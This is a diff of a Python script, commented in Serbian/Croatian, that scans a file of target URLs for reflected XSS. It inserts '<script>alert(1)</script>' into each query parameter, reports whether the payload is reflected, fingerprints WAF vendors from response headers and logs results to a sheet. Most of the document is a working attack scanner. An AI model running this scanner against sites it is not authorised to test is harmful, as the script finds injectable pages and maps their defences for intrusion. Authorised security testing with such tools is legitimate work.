@@ -1,34 +1,55 @@
 import requests
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from utils.log_utils import log_to_sheet
 
 XSS_PAYLOAD = "<script>alert(1)</script>"
-def load_targets(file_path="targets.txt"):
+
+def load_targets(file_path):
     with open(file_path, "r") as f:
         return [line.strip() for line in f if line.strip()]
 
 def inject_payload(url, payload):
     parsed = urlparse(url)
     qs = parse_qs(parsed.query)
-    injected_qs = {k: payload for k in qs}
-    new_query = urlencode(injected_qs, doseq=True)
-    injected_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
-    return injected_url
+    new_qs = {k: payload for k in qs}
+    new_query = urlencode(new_qs, doseq=True)
+    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
 
-def check_reflection(response_text, payload):
-    return payload in response_text
+def detect_waf(url):
+    try:
+        res = requests.get(url, timeout=5)
+        headers = res.headers
+        waf_signs = ["cloudflare", "sucuri", "akamai", "imperva", "aws", "360wzb", "wallarm", "barracuda"]
+        for k, v in headers.items():
+            if any(waf in v.lower() for waf in waf_signs):
+                return True, f"WAF Detected: {k}: {v}"
+    except:
+        return False, "Greška pri detekciji WAF-a"
+    return False, "Bez WAF zaštite"
 
 def run_xss_scan():
-    targets = load_targets()
+    targets = load_targets("targets/targets.txt")
+
     for url in targets:
+        print(f"[+] Testiram: {url}")
+        waf_status, waf_info = detect_waf(url)
+        print(f"[WAF] {waf_info}")
+
         injected_url = inject_payload(url, XSS_PAYLOAD)
-        print(f"[+] Testiram: {injected_url}")
         try:
-            res = requests.get(injected_url)
-            if check_reflection(res.text, XSS_PAYLOAD):
-                print("[!!] Reflektovani XSS MOGUĆ!")
+            res = requests.get(injected_url, timeout=5)
+            if XSS_PAYLOAD in res.text:
+                rezultat = f"[!] Moguća XSS ranjivost na {url}\nWAF: {waf_info}"
+                print(rezultat)
+                log_to_sheet(__file__, rezultat)
             else:
-                print("[-] Nema refleksije.")
-        except Exception as e:
-            print(f"[X] Greška: {e}")
+                rezultat = f"[-] Nema refleksije.\nWAF: {waf_info}"
+                print(rezultat)
+                log_to_sheet(__file__, rezultat)
+        except requests.RequestException as e:
+            error = f"[X] Greška prilikom slanja zahteva ka {url}: {str(e)}"
+            print(error)
+            log_to_sheet(__file__, error)
+
 if __name__ == "__main__":
     run_xss_scan()
